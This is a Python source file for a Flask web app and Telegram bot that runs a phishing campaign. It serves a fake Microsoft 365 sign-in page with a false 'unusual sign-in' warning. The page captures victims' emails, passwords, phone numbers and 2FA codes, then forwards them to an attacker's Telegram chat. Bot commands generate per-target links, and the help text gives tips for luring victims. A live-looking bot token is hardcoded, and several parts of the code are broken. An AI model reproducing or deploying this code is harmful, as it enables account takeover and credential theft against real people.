from flask import Flask, request, render_template_string
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.ext import CallbackContext
import logging
import os
import requests
import json
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ✅ NEW BOT TOKEN (Securely Updated)
BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('6593129349')  # Render Environment Variable

PHISHING_DATA = []
STATS = {'visits': 0, 'captures': 0}

# Enhanced Professional Template (Microsoft 365 Style)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Sign in</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{min-height:100vh;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;}
        .container{width:100%;max-width:400px;padding:40px 32px;background:#fff;border-radius:8px;box-shadow:0 20px 25px -5px rgba(0,0,0,0.1),0 10px 10px -5px rgba(0,0,0,0.04);margin:20px;}
        .logo{display:flex;align-items:center;justify-content:center;margin-bottom:32px;}
        .logo svg{height:24px;width:80px;margin-right:12px;}
        .logo-text{font-size:28px;font-weight:700;color:#202124;letter-spacing:-0.5px;}
        .form-group{position:relative;margin-bottom:24px;}
        label{font-size:14px;color:#5f6368;margin-bottom:8px;display:block;}
        input{width:100%;padding:12px 16px;border:1px solid #dadce0;border-radius:8px;font-size:16px;transition:all 0.2s;}
        input:focus{outline:none;border-color:#1a73e8;box-shadow:0 1px 0 0 #1a73e8;}
        .password-toggle{position:absolute;right:12px;top:42px;cursor:pointer;color:#5f6368;}
        .submit-btn{width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;transition:background 0.2s;}
        .submit-btn:hover{background:#1557b0;}
        .submit-btn:active{transform:translateY(1px);}
        .forgot-password{text-align:center;margin-top:24px;}
        .forgot-password a{color:#1a73e8;text-decoration:none;font-size:14px;}
        .urgency-bar{background:#fbbc04;padding:12px 16px;margin:-40px -32px 32px -32px;border-radius:8px 8px 0 0;font-weight:500;color:#000;}
    </style>
</head>
<body>
    <div class="container">
        <div class="urgency-bar">⚠️ Unusual sign-in attempt detected - Please verify your identity</div>
        <div class="logo">
            <svg viewBox="0 0 24 24"><path fill="#f25022" d="M5 3h14v2H5z"/></svg>
            <span class="logo-text">Microsoft Account</span>
        </div>
        <form method="POST" id="form">
            <div class="form-group">
                <label>Email or phone</label>
                <input type="email" name="email" placeholder="example@outlook.com" required autocomplete="username">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
                <span class="password-toggle">👁️</span>
            </div>
            <div class="form-group">
                <label>Phone (optional)</label>
                <input type="tel" name="phone" placeholder="+1 (555) 123-4567">
            </div>
            <div class="form-group">
                <label>2FA Code (if enabled)</label>
                <input type="text" name="otp" placeholder="123456">
            </div>
            <input type="hidden" name="user_id" value="{{ user_id }}">
            <input type="hidden" name="ip" value="{{ request.remote_addr }}">
            <button type="submit" class="submit-btn">Sign in</button>
        </form>
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
    </div>
    <script>
        // Submit animation
        document.getElementById('form').addEventListener('submit', function(){
            const btn = document.querySelector('.submit-btn');
            btn.textContent = 'Signing in...';
            btn.disabled = true;
        });
    </script>
</body>
</html>
"""

# Telegram Bot Commands
async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name or "User"
    
    domain = request.host_url.rstrip('/')
    phishing_url = f"{domain}/phish/{user_id}"
    
    message = f"""
🔥 **PHISHING LINK GENERATED!**

👤 **Target:** `{username}` (ID: `{user_id}`)
🔗 **Link:** `{phishing_url}`

📋 **Copy this exact link** and send to target!

⚡ **Pro Tip:** Shorten with bit.ly for better results
"""
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def stats(update: Update, context: CallbackContext):
    global STATS
    success_rate = (STATS['captures'] / max(STATS['visits'], 1)) * 100
    stats_msg = f"""
📊 **REALTIME STATS:**
👀 Visits: `{STATS['visits']}`
🎣 Captures: `{STATS['captures']}`
📈 Success Rate: `{success_rate:.1f}%`
💾 Total Data: `{len(PHING_DATA)}`

Status: 🟢 **LIVE**
"""
    await update.message.reply_text(stats_msg, parse_mode='Markdown')

async def data(update: Update, context: CallbackContext):
    if not PHISHING_DATA:
        await update.message.reply_text("❌ **No captures yet!**\n\nSend `/start` to generate links!")
        return
    
    recent = PHISHING_DATA[-10:]
    data_msg = "🎯 **LATEST CAPTURES:**\n\n"
    
    for i, capture in enumerate(recent, 1):
        data_msg += f"{i}. **{capture['email']}** | {capture['time']}\n"
        data_msg += f"   🔑 `{capture['password']}`\n"
        if capture['otp']: data_msg += f"   🔢 `{capture['otp']}`\n"
        data_msg += "\n"
    
    await update.message.reply_text(data_msg, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    help_text = """
🤖 **PHISHING BOT COMMANDS:**

/start - Generate phishing link
/stats - View campaign statistics  
/data - See captured credentials
/help - This help message

**Admin Setup:**
1. Bot ko message bhejo
2. Render dashboard → Environment Variables
3. ADMIN_CHAT_ID = your_chat_id (getUpdates se pao)

**Success Tips:**
• Use URL shortener
• Target via DM/email
• Mobile pe test karo
• Realistic urgency add karo
"""
    await update.message.reply_text(help_text, parse_mode='Markdown')

# Flask Routes
@app.route('/')
@app.route('/bot')
def home():
    return f"""
<!DOCTYPE html>
<html>
<head><title>Phishing Bot Active</title></head>
<body style="font-family:Arial;padding:40px;">
    <h1>🚀 Bot Status: <span style="color:green">LIVE</span></h1>
    <p><b>Token:</b> Active (New Token Loaded)</p>
    <p>Telegram: <code>@your_bot_username</code></p>
    <h3>Commands:</h3>
    <ul>
        <li><code>/start</code> - Get phishing link</li>
        <li><code>/stats</code> - Campaign stats</li>
        <li><code>/data</code> - Captured credentials</li>
    </ul>
    <hr>
    <p><b>Web Stats:</b> Visits: {STATS['visits']} | Captures: {STATS['captures']}</p>
</body>
</html>
"""

@app.route('/phish/<user_id>')
def phishing_page(user_id):
    global STATS
    STATS['visits'] += 1
    return render_template_string(HTML_TEMPLATE, user_id=user_id)

@app.route('/phish/<user_id>', methods=['POST'])
def capture_credentials(user_id):
    global STATS, PHISHING_DATA
    
    data = {
        'user_id': user_id,
        'email': request.form.get('email', ''),
        'password': request.form.get('password', ''),
        'phone': request.form.get('phone', ''),
        'otp': request.form.get('otp', ''),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    PHISHING_DATA.append(data)
    STATS['captures'] += 1
    
    # Auto-send to admin if configured
    if ADMIN_CHAT_ID:
        send_to_admin(data)
    
    return '''
    <!DOCTYPE html>
    <html><head><title>Success</title></head>
    <body style="background:#f0f2f5;padding:60px;text-align:center;">
        <div style="max-width:400px;margin:auto;background:white;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);">
            <div style="font-size:48px;color:#34a853;margin-bottom:20px;">✅</div>
            <h2 style="color:#202124;margin-bottom:12px;">You're signed in</h2>
            <p style="color:#5f6368;">Redirecting to your account...</p>
        </div>
        <script>
            setTimeout(() => window.location.href = "https://outlook.live.com", 2500);
        </script>
    </body></html>
    '''

def send_to_admin(data):
    message = f"""
🔔 **NEW CREDENTIALS CAPTURED!** 🔔

👤 **User ID:** `{data['user_id']}`
📧 **Email:** `{data['email']}`
🔑 **Password:** `{data['password']}`
📱 **Phone:** `{data['phone'] or 'N/A'}`
🔢 **OTP:** `{data['otp'] or 'N/A'}`
🌐 **IP:** `{data['ip']}`
🖥️ **Device:** `{data['user_agent'][:50]}...`
⏰ **Time:** `{data['time']}`

📊 **STATS:** {STATS['captures']} captures | {STATS['visits']} visits
"""
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={
            'chat_id': ADMIN_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown',
            'disable_web_page_preview': True
        })
    except:
        pass

if __name__ == '__main__':
    # Initialize Bot (Polling mode for simplicity)
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("data", data))
    application.add_handler(CommandHandler("help", help_command))
    
    print("🚀 Bot Starting...")
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)